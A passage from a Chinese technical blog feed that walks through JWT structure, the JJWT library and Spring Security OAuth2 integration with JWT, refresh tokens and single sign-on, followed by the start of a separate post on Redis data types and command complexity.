<p>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密 的，意味着该部分信息可以归类为明文信息。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1516239022</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示：声明中不要放一些敏感信息。</p>
<h3 id="签证和签名"><a href="#签证和签名" class="headerlink" title="签证和签名"></a>签证和签名</h3><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成： </p>
<ol>
<li>header (base64后的)</li>
<li>payload (base64后的) </li>
<li>secret（<strong>盐</strong>，一定要保密)</li>
</ol>
<p>注意： secret 是保存在服务器端的， jwt 的签发生成也是在服务器端的， secret 就是用来进行 jwt 的签发和 jwt 的验证，所以，它就是你<strong>服务端的私钥</strong>，在任何场景都不应该流露出去。一旦客户端得知 这个 secret , 那就意味着客户端是可以自我签发 jwt 了</p>
<h2 id="JJWT"><a href="#JJWT" class="headerlink" title="JJWT"></a>JJWT</h2><p>JJWT是一个提供端到端的JWT创建和验证的Java库。永远免费和开源(Apache License，版本2.0)，JJW 很容易使用和理解。它被设计成一个以建筑为中心的流畅界面，隐藏了它的大部分复杂性。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--jjwt依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="JJWT生成与解析"><a href="#JJWT生成与解析" class="headerlink" title="JJWT生成与解析"></a>JJWT生成与解析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JwtBuilder jwtBuilder = Jwts.builder()</span><br><span class="line">      <span class="comment">//唯一id&#123;&quot;id&quot;: &quot;888&quot;&#125;</span></span><br><span class="line">      .setId(<span class="string">&quot;888&quot;</span>)</span><br><span class="line">      <span class="comment">//接收的用户&#123;“sub”:&quot;Rose&quot;&#125;</span></span><br><span class="line">      .setSubject(<span class="string">&quot;Rose&quot;</span>)</span><br><span class="line">      <span class="comment">//签发时间&#123;“iat&quot; : “ ”&#125;</span></span><br><span class="line">      .setIssuedAt(<span class="keyword">new</span> Date())</span><br><span class="line">      <span class="comment">//签名算法及密钥</span></span><br><span class="line">      .signWith(SignatureAlgorithm.HS256, <span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">     <span class="comment">//失效时间</span></span><br><span class="line">	 .setExpiration(<span class="keyword">new</span> Date(System.currentTimeMillis() + (<span class="number">60</span> * <span class="number">10</span>)));;</span><br><span class="line">String token = jwtBuilder.compact();</span><br><span class="line">System.out.println(token);</span><br><span class="line"></span><br><span class="line">String[] split = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">Arrays.stream(split).forEach(s-&gt;&#123;</span><br><span class="line">   System.out.println(Base64Codec.BASE64.decodeToString(s));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解析token,获取claims,jwt中荷载声明的对象</span></span><br><span class="line">Claims claims=(Claims)Jwts.parser()</span><br><span class="line">      <span class="comment">//密钥</span></span><br><span class="line">      .setSigningKey(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">      .parse(token)</span><br><span class="line">      .getBody();</span><br><span class="line">System.out.println(<span class="string">&quot;id&quot;</span>+claims.getId());</span><br><span class="line">System.out.println(<span class="string">&quot;sub&quot;</span>+claims.getSubject());</span><br><span class="line">System.out.println(<span class="string">&quot;iat&quot;</span>+claims.getIssuedAt());</span><br></pre></td></tr></table></figure>

<h1 id="Spring-Security-Oauth2-整合JWT"><a href="#Spring-Security-Oauth2-整合JWT" class="headerlink" title="Spring Security Oauth2 整合JWT"></a>Spring Security Oauth2 整合JWT</h1><h3 id="整合jwt"><a href="#整合jwt" class="headerlink" title="整合jwt"></a>整合jwt</h3><p>添加配置文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtTokenStoreConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtAccessTokenConverter jwtAccessTokenConverter;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TokenStore <span class="title">getJwtTokenStore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JwtTokenStore(jwtAccessTokenConverter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JwtAccessTokenConverter <span class="title">jwtAccessTokenConverter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JwtAccessTokenConverter jwtAccessTokenConverter = <span class="keyword">new</span> JwtAccessTokenConverter();</span><br><span class="line">        <span class="comment">//设置密钥</span></span><br><span class="line">        jwtAccessTokenConverter.setSigningKey(<span class="string">&quot;test_key&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> jwtAccessTokenConverter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(&quot;getJwtTokenStore&quot;)</span></span><br><span class="line"><span class="keyword">private</span> TokenStore jwtTokenStore;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(&quot;jwtAccessTokenConverter&quot;)</span></span><br><span class="line"><span class="keyword">private</span> AccessTokenConverter tokenConverter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 密码模式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> endpoints</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(AuthorizationServerEndpointsConfigurer endpoints)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        endpoints.authenticationManager(authenticationManager)</span><br><span class="line">                .userDetailsService(userService)</span><br><span class="line">                <span class="comment">//使用redis存储token</span></span><br><span class="line"><span class="comment">//                .tokenStore(tokenStore);</span></span><br><span class="line">                .tokenStore(jwtTokenStore)</span><br><span class="line">                .accessTokenConverter(tokenConverter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="扩展jwt存储的内容"><a href="#扩展jwt存储的内容" class="headerlink" title="扩展jwt存储的内容"></a>扩展jwt存储的内容</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  扩展token声明存储内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtTokenEnhancer</span> <span class="keyword">implements</span> <span class="title">TokenEnhancer</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OAuth2AccessToken <span class="title">enhance</span><span class="params">(OAuth2AccessToken oAuth2AccessToken, OAuth2Authentication oAuth2Authentication)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; stringObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        stringObjectHashMap.put(<span class="string">&quot;enhance&quot;</span>,<span class="string">&quot;enhancer info&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DefaultOAuth2AccessToken defaultOauth2AccessToken =(DefaultOAuth2AccessToken)oAuth2AccessToken;</span><br><span class="line">        defaultOauth2AccessToken.setAdditionalInformation(stringObjectHashMap);</span><br><span class="line">        <span class="keyword">return</span> defaultOauth2AccessToken ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 密码模式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> endpoints</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(AuthorizationServerEndpointsConfigurer endpoints)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置jwt增强内容。tokenEnhancerChain为tokenEnhancer的实现类</span></span><br><span class="line">        TokenEnhancerChain tokenEnhancerChain = <span class="keyword">new</span> TokenEnhancerChain();</span><br><span class="line">        ArrayList&lt;TokenEnhancer&gt; tokenEnhancers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        tokenEnhancers.add(jwtTokenEnhancer);</span><br><span class="line">        <span class="comment">//将accessToken转换为JwtAccessToken</span></span><br><span class="line">        tokenEnhancers.add(jwtAccessTokenConverter);</span><br><span class="line">        tokenEnhancerChain.setTokenEnhancers(tokenEnhancers);</span><br><span class="line"></span><br><span class="line">        endpoints.authenticationManager(authenticationManager)</span><br><span class="line">                .userDetailsService(userService)</span><br><span class="line">                <span class="comment">//使用redis存储token</span></span><br><span class="line"><span class="comment">//                .tokenStore(tokenStore);</span></span><br><span class="line">                .tokenStore(jwtTokenStore)</span><br><span class="line">                .accessTokenConverter(jwtAccessTokenConverter)</span><br><span class="line">                .tokenEnhancer(tokenEnhancerChain);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解析JWT内容"><a href="#解析JWT内容" class="headerlink" title="解析JWT内容"></a>解析JWT内容</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  jwt依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getCurrentUser&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getCurrentUser</span><span class="params">(Authentication authentication, HttpServletRequest request)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    String header = request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">    String token = header.substring(header.lastIndexOf(<span class="string">&quot;bearer&quot;</span>) + <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">return</span> Jwts.parser()</span><br><span class="line">        .setSigningKey(<span class="string">&quot;test_key&quot;</span>.getBytes(StandardCharsets.UTF_8))</span><br><span class="line">        .parseClaimsJws(token)</span><br><span class="line">        .getBody();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201209164505128.png" alt="image-20201209164505128"></p>
<h3 id="刷新令牌"><a href="#刷新令牌" class="headerlink" title="刷新令牌"></a>刷新令牌</h3><p>在Spring Cloud Security 中使用oauth2时，如果令牌失效了，可以使用刷新令牌通过refresh_token 的授权模式再次获取access_token。 </p>
<p>只需修改认证服务器的配置，添加refresh_token的授权模式即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 授权服务器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clients 客户端</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(ClientDetailsServiceConfigurer clients)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//内存内</span></span><br><span class="line">    clients.inMemory()</span><br><span class="line">        <span class="comment">//客户端id</span></span><br><span class="line">        .withClient(<span class="string">&quot;client&quot;</span>)</span><br><span class="line">        <span class="comment">//密钥</span></span><br><span class="line">        .secret(passwordEncoder.encode(<span class="string">&quot;12354&quot;</span>))</span><br><span class="line">        <span class="comment">//token有效时间</span></span><br><span class="line">        .accessTokenValiditySeconds(<span class="number">3060</span>)</span><br><span class="line">        <span class="comment">//刷新token</span></span><br><span class="line">        .refreshTokenValiditySeconds(<span class="number">86000</span>)</span><br><span class="line">        .redirectUris(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="comment">//授权范围</span></span><br><span class="line">        .scopes(<span class="string">&quot;all&quot;</span>)</span><br><span class="line">        <span class="comment">//授权类型</span></span><br><span class="line">        <span class="comment">//authorization_code;授权码模式</span></span><br><span class="line">        <span class="comment">//password: 密码模式</span></span><br><span class="line">        <span class="comment">//refresh_token:刷新令牌</span></span><br><span class="line">        .authorizedGrantTypes(<span class="string">&quot;authorization_code&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201209170717505.png" alt="image-20201209170717505"></p>
<p><img src="https://csn.damyoung.cn/image-20201209170938331.png" alt="image-20201209170938331"></p>
<h1 id="Spring-Security-Oauth2-整合单点登录（SSO）"><a href="#Spring-Security-Oauth2-整合单点登录（SSO）" class="headerlink" title="Spring Security Oauth2 整合单点登录（SSO）"></a>Spring Security Oauth2 整合单点登录（SSO）</h1><h2 id="单点登录简介"><a href="#单点登录简介" class="headerlink" title="单点登录简介"></a>单点登录简介</h2><p>单点登录（SSO——Single Sign On）对于我们来说已经不陌生了。对于大型系统来说使用单点登录可以减少用户很多的麻烦。就拿百度来说吧，百度下面有很多的子系统——百度经验、百度知道、百度文库等等，如果我们使用这些系统的时候，每一个系统都需要我们输入用户名和密码登录一次的话，我相信用户体验肯定会直线下降。当然，对于个人博客这类系统来说根本就用不上单点登录了</p>
<p>假如，我们的系统很庞大，但是就是这一个系统，并没有什么子系统。这时我们也不需要单点登录。我们需要的是搭建集群环境，这里虽说只有一个系统，但是多台主机负载均衡的话就涉及到<a href="http://www.onmpw.com/tm/xwzj/network_144.html">session共享的问题了</a>。Session共享问题较之于SSO来说将比较容易解决了。</p>
<h2 id="整合环境"><a href="#整合环境" class="headerlink" title="整合环境"></a>整合环境</h2><p>创建客户端client01</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="comment">#防止Cookie冲突，冲突会导致登录验证不通过</span></span><br><span class="line"><span class="meta">server.servlet.session.cookie.name</span>=<span class="string">OAUTH2-CLIENT-SESSIONID01</span></span><br><span class="line"><span class="comment">#授权服务器地址</span></span><br><span class="line"><span class="meta">oauth2-server-url</span>: <span class="string">http://localhost:8085</span></span><br><span class="line"><span class="comment">#与授权服务器对应的配置</span></span><br><span class="line"><span class="meta">security.oauth2.client.client-id</span>=<span class="string">client</span></span><br><span class="line"><span class="meta">security.oauth2.client.client-secret</span>=<span class="string">12354</span></span><br><span class="line"><span class="meta">security.oauth2.client.user-authorization-uri</span>=<span class="string">$&#123;oauth2-serverurl&#125;/oauth/authorize</span></span><br><span class="line"><span class="meta">security.oauth2.client.access-token-uri</span>=<span class="string">$&#123;oauth2-server-url&#125;/oauth/token</span></span><br><span class="line"><span class="meta">security.oauth2.resource.jwt.key-uri</span>=<span class="string">$&#123;oauth2-server-url&#125;/oauth/token_key</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201209175207743.png" alt="image-20201209175207743"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getCurrentUser&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getCurrentUser</span><span class="params">(Authentication authentication)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> authentication;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器配置</p>
<p>在授权服务器配置中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(AuthorizationServerSecurityConfigurer security)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//获取密钥必须要身份认证,单点登录必备</span></span><br><span class="line">    security.tokenKeyAccess(<span class="string">&quot;isAuthenticated()&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201209175611283.png" alt="image-20201209175611283"></p>
<p>启动</p>
<p><img src="https://csn.damyoung.cn/image-20201209180344159.png" alt="image-20201209180344159"></p>
<p><img src="https://csn.damyoung.cn/image-20201209180443670.png" alt="image-20201209180443670"></p>
<p><img src="https://csn.damyoung.cn/image-20201209180506771.png" alt="image-20201209180506771"></p>
]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis</title>
    <url>/2021/02/27/Redis/</url>
    <content><![CDATA[<h1 id="1-Redis数据类型"><a href="#1-Redis数据类型" class="headerlink" title="1. Redis数据类型"></a>1. Redis数据类型</h1><p>Redis提供了<code>String</code>,<code>Hash</code>,<code>List</code>,<code>Set</code>,<code>Zset</code>五种数据类型。</p>
<h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><p><code>String</code>数据结构是最简单的<code>key-value</code>类型，<code>value</code>不仅可以是<code>String</code>,也可以是数字，包括整数，浮点数和二进制数。</p>
<p><code>string</code> 数据结构是简单的 <code>key-value</code> 类型。虽然 Redis 是用 C 语言写的，但是 Redis 并没有使用 C 的字符串表示，而是自己构建了一种 <strong>简单动态字符串</strong>（simple dynamic string，<strong>SDS</strong>）。相比于 C 的原生字符串，Redis 的 SDS 不光可以保存文本数据还可以保存二进制数据，并且获取字符串长度复杂度为 <code>O(1)</code>（C 字符串为 <code>O(N)</code>）,除此之外，Redis 的 SDS API 是安全的，不会造成缓冲区溢出。</p>
<p>主要的应用有：缓存，计数（比如用户的访问次数、热点文章的点赞转发数量等等），共享<code>session</code>和限速。</p>
<a id="more"></a>

<p>内部编码主要有：</p>
<ul>
<li><code>int</code>:8个字节的长整型</li>
<li><code>embstr</code>:小于等于39个字节的字符串</li>
<li><code>raw</code>:大于39个字节的字符串</li>
</ul>
<h3 id="各个指令的时间复杂度"><a href="#各个指令的时间复杂度" class="headerlink" title="各个指令的时间复杂度"></a>各个指令的时间复杂度</h3><ul>
<li><strong>SET</strong>：为一个 key 设置 value，可以配合 EX/PX 参数指定 key 的有效期，通过 NX/XX 参数针对 key 是否存在的情况进行区别操作，时间复杂度 <code>O(1)</code></li>
<li><strong>GET</strong>：获取某个 key 对应的 value，时间复杂度 <code>O(1)</code></li>
<li><strong>GETSET</strong>：为一个 key 设置 value，并返回该 key 的原 value，时间复杂度 <code>O(1)</code></li>
<li><strong>MSET</strong>：为多个 key 设置 value，时间复杂度 <code>O(N)</code></li>
<li><strong>MSETNX</strong>：同 MSET，如果指定的 key 中有任意一个已存在，则不进行任何操作，时间复杂度 <code>O(N)</code></li>
<li><strong>MGET</strong>：获取多个 key 对应的 value，时间复杂度 <code>O(N)</code></li>
<li><strong>INCR</strong>：将 key 对应的 value 值自增1，并返回自增后的值。只对可以转换为整型的 String 数据起作用。时间复杂度 <code>O(1)</code></li>
<li><strong>INCRBY</strong>：将 key 对应的 value 值自增指定的整型数值，并返回自增后的值。只对可以转换为整型的 String 数据起作用。时间复杂度 <code>O(1)</code></li>
<li><strong>DECR/DECRBY</strong>：同 INCR/INCRBY，自增改为自减。</li>
</ul>
<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p><code>Hash</code>是一个<code>string</code>类型的<code>field</code>和<code>value</code>的映射表，<code>hash</code>特别适合用于存储对象，后续操作的时候，可以直接仅仅修改这个对象某个字段的值。比如可以用<code>hash</code>数据结构来存储用户信息，商品信息等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; JavaUser</span><br><span class="line">value &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;:1,</span><br><span class="line">    &quot;name&quot;:&quot;xiaoming&quot;,</span><br><span class="line">    &quot;age&quot;: 22,</span><br><span class="line">    &quot;location&quot;: &quot;GuangDong,Jieyang&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要应用有：将关系型数据库每一行数据存储为一个哈希键</p>
<p>内部编码主要：</p>
<ul>
<li><code>ziplist</code>(<strong>压缩列表</strong>)：当哈希类型元素个数小于<code>hash-max-ziplist-entries</code>配置（默认512个字节），同时所有值小于<code>hash-max-ziplist-value</code>配置（默认64个字节）时，使用<code>ziplist</code>作为内部实现，<code>ziplist</code>使用更加紧凑的结构实现多个元素的连续存储，在节省内存方面更加优秀</li>
<li><code>hashtable</code>(<strong>哈希表</strong>)：当哈希类型无法满足<code>ziplist</code>的条件时，使用<code>hashtable</code>作为内部实现，因为此时<code>ziplist</code>读写效率会下降，而<code>hashtable</code>读写时间复杂度为O(1)</li>
</ul>
<h3 id="各个指令的时间复杂度-1"><a href="#各个指令的时间复杂度-1" class="headerlink" title="各个指令的时间复杂度"></a>各个指令的时间复杂度</h3><p>与 Hash 相关的常用命令：</p>
<ul>
<li><strong>HSET</strong>：将 key 对应的 Hash 中的 field 设置为 value。如果该 Hash 不存在，会自动创建一个。时间复杂度 <code>O(1)</code></li>
<li><strong>HGET</strong>：返回指定 Hash 中 field 字段的值，时间复杂度 <code>O(1)</code></li>
<li><strong>HMSET/HMGET</strong>：同 HSET 和 HGET，可以批量操作同一个 key 下的多个 field，时间复杂度：<code>O(N)</code>，N为一次操作的 field 数量</li>
<li><strong>HSETNX</strong>：同 HSET，但如 field 已经存在，HSETNX 不会进行任何操作，时间复杂度 <code>O(1)</code></li>
<li><strong>HEXISTS</strong>：判断指定Hash中 field 是否存在，存在返回1，不存在返回0，时间复杂度 <code>O(1)</code></li>
<li><strong>HDEL</strong>：删除指定 Hash 中的 field（1个或多个），时间复杂度：<code>O(N)</code>，N 为操作的 field 数量</li>
<li><strong>HINCRBY</strong>：同 INCRBY 命令，对指定 Hash 中的一个 field 进行 INCRBY，时间复杂度 <code>O(1)</code></li>
</ul>
<p>应谨慎使用的Hash相关命令：</p>
<ul>
<li><strong>HGETALL</strong>：返回指定 Hash 中所有的 field-value 对。返回结果为数组，数组中 field 和 value 交替出现。时间复杂度 <code>O(N)</code></li>
<li><strong>HKEYS/HVALS</strong>：返回指定 Hash 中所有的 field/value，时间复杂度 <code>O(N)</code></li>
</ul>
<p>上述三个命令都会对 Hash 进行完整遍历，Hash中的 field 数量与命令的耗时线性相关，对于尺寸不可预知的 Hash，应严格避免使用上面三个命令，而改为使用 HSCAN 命令进行游标式的遍历</p>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p><code>list</code>就是链表，Redis中<code>list</code>的应用场景非常多，也是Redis最重要的数据结构之一</p>
<p><code>list</code>的实现是一个双向链表，既可以支持反向查找和遍历，更方便操作，不过带来了部分额外的内存开销。</p>
<p>另外可以通过<code>lrange</code>，就是从某个元素开始读取多少个元素，可以基于<code>list</code>实现分页查询，基于 redis实现简单的高性能分页，可以做类似微博那种下拉不断分页的东西（一页一页的往下走），性能高。</p>
<p>主要的应用有：栈、队列，消息队列（抢购），文章列表等</p>
<p>内部编码有：</p>
<ul>
<li><code>ziplist</code>(<strong>压缩列表</strong>)：当哈希类型元素个数小于<code>list-max-ziplist-entries</code>配置（默认512），同时所有值小于<code>list-max-ziplist-value</code>配置（默认64）时，使用<code>ziplist</code>作为内部实现，<code>ziplist</code>使用更加紧凑的结构实现多个元素的连续存储，在节省内存方面更加优秀</li>
<li><code>linkedlist</code>(<strong>链表</strong>)：当列表类型无法满足<code>ziplist</code>条件时，使用链表作为内部实现</li>
</ul>
<h3 id="各个指令的时间复杂度-2"><a href="#各个指令的时间复杂度-2" class="headerlink" title="各个指令的时间复杂度"></a>各个指令的时间复杂度</h3><ul>
<li><strong>LPUSH</strong>：向指定 List 的左侧（即头部）插入 1 个或多个元素，返回插入后的 List 长度。时间复杂度 <code>O(N)</code>，N 为插入元素的数量</li>
<li><strong>RPUSH</strong>：同 LPUSH，向指定 List 的右侧（即尾部）插入 1 或多个元素</li>
<li><strong>LPOP</strong>：从指定 List 的左侧（即头部）移除一个元素并返回，时间复杂度 <code>O(1)</code></li>
<li><strong>RPOP</strong>：同 LPOP，从指定 List 的右侧（即尾部）移除 1 个元素并返回</li>
<li><strong>LPUSHX/RPUSHX</strong>：与 LPUSH/RPUSH 类似，区别在于，LPUSHX/RPUSHX 操作的 key 如果不存在，则不会进行任何操作</li>
<li><strong>LLEN</strong>：返回指定 List 的长度，时间复杂度 <code>O(1)</code></li>
<li><strong>LRANGE</strong>：返回指定 List 中指定范围的元素（双端包含，即 <code>LRANGE key 0 10</code> 会返回 11 个元素），时间复杂度 <code>O(N)</code>。应尽可能控制一次获取的元素数量，一次获取过大范围的 List 元素会导致延迟，同时对长度不可预知的 List，避免使用 <code>LRANGE key 0 -1</code> 这样的完整遍历操作。</li>
</ul>
<p>应谨慎使用的List相关命令：</p>
<ul>
<li><strong>LINDEX</strong>：返回指定 List 指定 index 上的元素，如果 index 越界，返回nil。index 数值是回环的，即 -1 代表 List 最后一个位置，-2 代表 List 倒数第二个位置。时间复杂度 <code>O(N)</code></li>
<li><strong>LSET</strong>：将指定 List 指定 index 上的元素设置为 value，如果 index 越界则返回错误，时间复杂度 <code>O(N)</code>，如果操作的是头/尾部的元素，则时间复杂度为 <code>O(1)</code></li>
<li><strong>LINSERT</strong>：向指定 List 中指定元素之前/之后插入一个新元素，并返回操作后的 List 长度。如果指定的元素不存在，返回 -1。如果指定 key 不存在，不会进行任何操作，时间复杂度 <code>O(N)</code></li>
</ul>
<p>由于 Redis 的 List 是链表结构的，上述的三个命令的算法效率较低，需要对 List 进行遍历，命令的耗时无法预估，在 List 长度大的情况下耗时会明显增加，应谨慎使用。</p>
